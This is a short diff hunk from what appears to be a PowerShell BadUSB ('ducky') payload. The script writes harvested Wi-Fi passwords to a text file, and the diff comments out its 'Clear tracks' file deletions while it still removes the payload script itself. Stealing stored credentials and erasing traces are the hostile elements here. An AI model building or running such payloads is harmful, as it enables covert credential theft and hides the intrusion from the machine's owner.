@@ -12,10 +12,10 @@ Out-File wifipass.txt -Append -InputObject $a
 }
 
 # Clear tracks
-rm *.xml
-rm *.txt
-cd ..
-rm wipass
+#rm *.xml
+#rm *.txt
+#cd ..
+#rm wipass
 
 # remove ducky payload
 rm d.ps1
